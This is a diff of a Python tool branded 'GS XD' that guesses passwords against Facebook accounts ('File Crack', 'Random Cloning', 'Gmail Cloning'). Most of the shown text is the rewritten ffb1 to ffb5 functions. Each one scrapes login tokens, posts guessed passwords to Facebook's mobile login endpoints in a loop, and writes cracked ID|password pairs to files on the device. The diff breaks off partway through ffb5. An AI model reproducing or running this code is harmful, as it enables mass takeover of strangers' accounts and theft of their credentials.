@@ -27,7 +27,7 @@ try:
 except ModuleNotFoundError: 
 	print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python gsriyad.py')
+	os.system('python GS XD.py')
 android_models=[]
 try:
 	xx = requests.get('https://raw.githubusercontent.com/AKING110/Data/main/sm.txt').text.splitlines()
@@ -111,7 +111,7 @@ while attemps < 12345677901:
     username = input('\033[1;92mUser Name:\033[1;37m ')
     password = input('\033[1;92mPassword:\033[1;37m ')
 
-    if username == '1' and password == '1':    	
+    if username == 'gsxd143' and password == 'gsxd143':    	
         print('\033[1;92mYou have successfully logged in.')
         break
     else:
@@ -134,7 +134,7 @@ logo=("""\033[1;97m
 \033[1;92m╔═════════════════════════════════════════╗
 \033[1;92m║ ᗙ  Owner    : MD RIYAD                  ║
 \033[1;92m║ ᗙ  Facebook : MD.RIYAD                  ║
-\033[1;92m║ ᗙ  Version  : 1.0                       ║
+\033[1;92m║ ᗙ  Version  : 0.9                       ║
 \033[1;92m║ ᗙ  Team     : GS POWER                  ║ 
 \033[1;92m╚═════════════════════════════════════════╝""")
 def linex():
@@ -301,12 +301,9 @@ def create_file_login():
     os.system('clear')
     print(logo)
     print(' [1] Create auto file (fast)')
-    print('\033[1;37m--------------------------------------------------')
     print(' [2] Create manual file')
-    print('\033[1;37m--------------------------------------------------')
     print(50*'-')
     foopt = input(' Choose option: ')
-    print('\033[1;37m--------------------------------------------------')
     if foopt =='1':
         auto_file(cookies,access_token)
     else:
@@ -315,7 +312,6 @@ def auto_file(cookies,access_token):
     global total
     os.system('clear & rm -rf .txt .temp.txt')
     print(logo)
-    print('\033[1;37m--------------------------------------------------')
     print(' File auto creation mode ...')
     print(50*'-')
     print('\033[1;35m Put range between 1 to 20\033[1;97m\n')
@@ -359,7 +355,7 @@ def auto_file(cookies,access_token):
     print(' Total ids: '+str(len(total)))
     print('\n')
     input(' Press enter to back ')
-    os.system('python gsriyad.py')
+    os.system('python GS XD.py')
 def iamBadBoy(exid,cookies,access_token,sf):
     try:
         global total,loop
@@ -410,7 +406,7 @@ def manual_file(cookies,access_token):
     print(' Total ids grabbed: '+str(len(ids)))
     print(' Ids file saved in: '+sf)
     input(' \nPress enter to back ')
-    os.system('python gsriyad.py')
+    os.system('python GS XD.py')
 def sids():
     os.system('clear')
     print(logo)
@@ -436,7 +432,7 @@ def sids():
     print(' New file saved as: '+new_save)
     print(50*'-')
     input('\n Press enter to back ')
-    os.system('python gsriyad.py')
+    os.system('python GS XD.py')
 def remove_dub():
     os.system('clear')
     print(logo)
@@ -453,7 +449,7 @@ def remove_dub():
         print(' Result file saved as: '+save_file)
         print(50*'-')
         input('\n Press enter to back ')
-        os.system('python gsriyad.py')
+        os.system('python GS XD.py')
     except FileNotFoundError:
         print(' File not found.')
 def login():
@@ -471,7 +467,7 @@ def login():
         open("fb_cookies.txt","w").write(cookies)
         print(' Logged in successfully ...')
         time.sleep(1)
-        os.system('python gsriyad.py')
+        os.system('python GS XD.py')
     except KeyError:
         print('\033[1;91m expired cookies.. , ')
         exit()
@@ -487,7 +483,7 @@ def menu():
 	print('\033[1;37m--------------------------------------------------')
 	print('\x1b[1;91m⧼ NOTE ⧽ :\x1b[1;92m FREE TOOLS ALL COUNTRY WORKING ')
 	print('\033[1;37m--------------------------------------------------')
-	print(' [1] File Crack \n [2] Random Cloning\n [3] Gmail Cloning\n [4] Contact With Owner\n [0] Exit Menu')
+	print(' [1] File Crack \n [2] Public ID Cloning\n [3] Random Cloning\n [4] Gmail Cloning\n [5] Contact With Owner\n [0] Exit Menu')
 	linex()
 	xd=input(' Choose an option: ')
 	if xd in ['1','01']:
@@ -506,7 +502,7 @@ def menu():
 		linex()
 		print(' [1] Api Method ')
 		print('\033[1;37m----------------------------------------------')
-		print('\033[92;1m [2] Best Normal Method ')
+		print('\033[92;1m [2] Api Method ')
 		print('\033[1;37m----------------------------------------------')
 		print('\033[92;1m [3] Normal Method ')
 		print('\033[1;37m----------------------------------------------')
@@ -579,25 +575,26 @@ def menu():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python gsriyad.py')
+		os.system('python GS XD.py')
 	#elif xd in ['2','02']:
 		#create_file_login()
-	#elif xd in ['2','02']:
-		#public()
 	elif xd in ['2','02']:
+		public()
+	elif xd in ['3','03']:
 		clear()
-		print(' [1] Pakistan Number Cloning\n [2] Bangladesh Number cloning\n [0] Back menu')
+		print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] gmail cloning\n [0] Back menu')
 		linex()
 		x=input(' Choose: ')
 		if x in ['1','01']:
 			pak()
 		elif x in ['2','02']:
 			bd()
-		
+		elif x in ['3','03']:
+			gmail()
 		else:
 			menu()
 			
-	elif xd in ['3','03']:
+	elif xd in ['4','04']:
 	   gmail()
 	#elif xd in ['6','06']:
 	    #sids()
@@ -605,7 +602,7 @@ def menu():
 		#remove_dub()
 	#elif xd in ['8','08']:
 		#os.system('rm -rf fb_cookies.txt')
-	elif xd in ['4','04']:
+	elif xd in ['6','06']:
 		os.system(f'xdg-open https://wa.me/+8801836751224');menu()
 			
 	elif xd in ['0','00']:
@@ -667,7 +664,7 @@ def pak():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python gsriyad.py')
+		os.system('python GS XD.py')
 def bd():
 		user=[]
 		clear()
@@ -714,7 +711,7 @@ def bd():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python gsriyad.py')
+		os.system('python GS XD.py')
 def gmail():
 		os.system('rm -rf .re.txt')
 		clear()
@@ -790,7 +787,7 @@ def gmail():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python gsriyad.py')
+		os.system('python GS XD.py')
 
 def ffb(ids,names,passlist):
 	global loop,oks,cps
@@ -1004,343 +1001,403 @@ def rcrack(ids,passlist):
 #----------------- Mobile File METHOD  -------------------------------------
 		
 def ffb1(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
+	global loop
+	global oks
 	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': '.mbasic.facebook.com',
- 'viewport-width': '980',
- 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
- 'sec-ch-ua-mobile': '?1',
- 'sec-ch-ua-platform': '"Android"',
- 'sec-ch-prefers-color-scheme': 'light',
- 'dnt': '1', 
- 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
- 'upgrade-insecure-requests': '1', 
- 'user-agent': ua, 
- 'sec-fetch-site': 'none',
- 'sec-fetch-mode': 'navigate',
- 'sec-fetch-user': '?1', 
- 'sec-fetch-dest': 'document',
- 'accept-encoding': 'gzip, deflate, br',
- 'accept-language': 'en-US,en;q=0.9',}
-			getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			AXI=session.cookies.get_dict().keys()
-			if "c_user" in AXI:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
-				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in AXI:
-				if 'y' in pcp:
+		for pas in passlist:
+			sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
+			session = requests.Session()
+			pro = random.choice(ugen)
+			free_fb = session.get('https://m.facebook.com').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":ids,
+			"pass":pas,
+			"login":"Log In"}
+			header_freefb = {'authority':'m.facebook.com',
+			'method': 'GET',
+			'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+ 		   'user-agent': 'Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0',}
+			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[7:22]
+				if uid in oks:pass
+				else:
+					if 'checkpoint' in str(lo):
+						print('\r\r\033[1;34m [GS XD-2F] '+ids+' | '+pas)
+					else:
+						print(f'\r\x1b[1;32m [GS XD-OK] '+ids+' | '+pas)
+						cek_apk(session,coki)
+						open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
+						oks.append(uid)
+						break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[24:39]
+				if uid in cps:pass
+				else:
 					print('\r\r\x1b[38;5;208m [GS XD-CP] '+ids+' | '+pas+'\033[1;97m')
 					open('/sdcard/GS XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
-				else:
-					break
 			else:
 				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
+		loop+=1
+	
+		time.sleep(10)
+	except:
+		pass
 		
 def ffb2(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
+	global loop
+	global oks
 	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'm.facebook.com',
- 'viewport-width': '980',
- 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
- 'sec-ch-ua-mobile': '?1',
- 'sec-ch-ua-platform': '"Android"',
- 'sec-ch-prefers-color-scheme': 'light',
- 'dnt': '1', 
- 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
- 'upgrade-insecure-requests': '1', 
- 'user-agent': ua, 
- 'sec-fetch-site': 'none',
- 'sec-fetch-mode': 'navigate',
- 'sec-fetch-user': '?1', 
- 'sec-fetch-dest': 'document',
- 'accept-encoding': 'gzip, deflate, br',
- 'accept-language': 'en-US,en;q=0.9',}
-			getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			AXI=session.cookies.get_dict().keys()
-			if "c_user" in AXI:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
-				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in AXI:
-				if 'y' in pcp:
+		for pas in passlist:
+			sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
+			session = requests.Session()
+			pro = random.choice(ugen)
+			free_fb = session.get('https://m.facebook.com').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":ids,
+			"pass":pas,
+			"login":"Log In"}
+			header_freefb = {'authority':'m.facebook.com',
+			'method': 'GET',
+			'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+ 		   'user-agent': 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36',}
+			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[7:22]
+				if uid in oks:pass
+				else:
+					if 'checkpoint' in str(lo):
+						print('\r\r\033[1;34m [GS XD-2F] '+ids+' | '+pas)
+					else:
+						print(f'\r\x1b[1;32m [GS XD-OK] '+ids+' | '+pas)
+						cek_apk(session,coki)
+						open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
+						oks.append(uid)
+						break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[24:39]
+				if uid in cps:pass
+				else:
 					print('\r\r\x1b[38;5;208m [GS XD-CP] '+ids+' | '+pas+'\033[1;97m')
 					open('/sdcard/GS XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
-				else:
-					break
 			else:
 				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
+		loop+=1
+	
+		time.sleep(10)
+	except:
+		pass
 		
 		
 def ffb3(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
+	global loop
+	global oks
 	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'd.facebook.com',
- 'viewport-width': '980',
- 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
- 'sec-ch-ua-mobile': '?1',
- 'sec-ch-ua-platform': '"Android"',
- 'sec-ch-prefers-color-scheme': 'light',
- 'dnt': '1', 
- 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
- 'upgrade-insecure-requests': '1', 
- 'user-agent': ua, 
- 'sec-fetch-site': 'none',
- 'sec-fetch-mode': 'navigate',
- 'sec-fetch-user': '?1', 
- 'sec-fetch-dest': 'document',
- 'accept-encoding': 'gzip, deflate, br',
- 'accept-language': 'en-US,en;q=0.9',}
-			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			AXI=session.cookies.get_dict().keys()
-			if "c_user" in AXI:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
-				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in AXI:
-				if 'y' in pcp:
+		for pas in passlist:
+			sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
+			session = requests.Session()
+			pro = random.choice(ugen)
+			free_fb = session.get('https://m.facebook.com').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":ids,
+			"pass":pas,
+			"login":"Log In"}
+			header_freefb = {'authority':'m.facebook.com',
+			'method': 'GET',
+			'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+ 		   'user-agent': 'Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1',}
+			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[7:22]
+				if uid in oks:pass
+				else:
+					if 'checkpoint' in str(lo):
+						print('\r\r\033[1;34m [GS XD-2F] '+ids+' | '+pas)
+					else:
+						print(f'\r\x1b[1;32m [GS XD-OK] '+ids+' | '+pas)
+						cek_apk(session,coki)
+						open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
+						oks.append(uid)
+						break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[24:39]
+				if uid in cps:pass
+				else:
 					print('\r\r\x1b[38;5;208m [GS XD-CP] '+ids+' | '+pas+'\033[1;97m')
 					open('/sdcard/GS XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
-				else:
-					break
 			else:
 				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
+		loop+=1
+	
+		time.sleep(10)
+	except:
+		pass
 		
 #----------------- Mbasic File METHOD  -------------------------------------
 		
 def ffb4(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
+	global loop
+	global oks
 	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'x.facebook.com',
-'viewport-width': '980',
- 'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
- 'sec-ch-ua-mobile': '?0',
- 'sec-ch-ua-platform': '"Chromium OS"',
- 'sec-ch-prefers-color-scheme': 'light',
- 'dnt': '1', 
- 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
- 'upgrade-insecure-requests': '1', 
- 'user-agent': ua, 
- 'sec-fetch-site': 'none',
- 'sec-fetch-mode': 'navigate',
- 'sec-fetch-user': '?1', 
- 'sec-fetch-dest': 'document',
- 'accept-encoding': 'gzip, deflate, br',
- 'accept-language': 'en-US,en;q=0.9',}
-			getlog = session.get(f'https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			AXI=session.cookies.get_dict().keys()
-			if "c_user" in AXI:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
-				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in AXI:
-				if 'y' in pcp:
+		for pas in passlist:
+			sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
+			session = requests.Session()
+			pro = random.choice(ugen)
+			free_fb = session.get('https://mbasic.facebook.com').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":ids,
+			"pass":pas,
+			"login":"Log In"}
+			header_freefb = {'authority':'mbasic.facebook.com',
+			'method': 'GET',
+			'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+ 		   'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.2; P023 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Safari/537.36',}
+			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[7:22]
+				if uid in oks:pass
+				else:
+					if 'checkpoint' in str(lo):
+						print('\r\r\033[1;34m [GS XD-2F] '+ids+' | '+pas)
+					else:
+						print(f'\r\x1b[1;32m [GS XD-OK] '+ids+' | '+pas)
+						cek_apk(session,coki)
+						open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
+						oks.append(uid)
+						break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[24:39]
+				if uid in cps:pass
+				else:
 					print('\r\r\x1b[38;5;208m [GS XD-CP] '+ids+' | '+pas+'\033[1;97m')
 					open('/sdcard/GS XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
-				else:
-					break
 			else:
 				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
+		loop+=1
+	
+		time.sleep(10)
+	except:
+		pass
 
 def ffb5(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
+	global loop
+	global oks
 	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'm.facebook.com',
-'viewport-width': '980',
- 'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
- 'sec-ch-ua-mobile': '?0',
- 'sec-ch-ua-platform': '"Linux"',
- 'sec-ch-prefers-color-scheme': 'light',
- 'dnt': '1', 
- 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
- 'upgrade-insecure-requests': '1', 
- 'user-agent': ua, 
- 'sec-fetch-site': 'none',
- 'sec-fetch-mode': 'navigate',
- 'sec-fetch-user': '?1', 
- 'sec-fetch-dest': 'document',
- 'accept-encoding': 'gzip, deflate, br',
- 'accept-language': 'en-US,en;q=0.9',}
-			getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			AXI=session.cookies.get_dict().keys()
-			if "c_user" in AXI:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
-				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in AXI:
-				if 'y' in pcp:
+		for pas in passlist:
+			sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
+			session = requests.Session()
+			pro = random.choice(ugen)
+			free_fb = session.get('https://mbasic.facebook.com').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
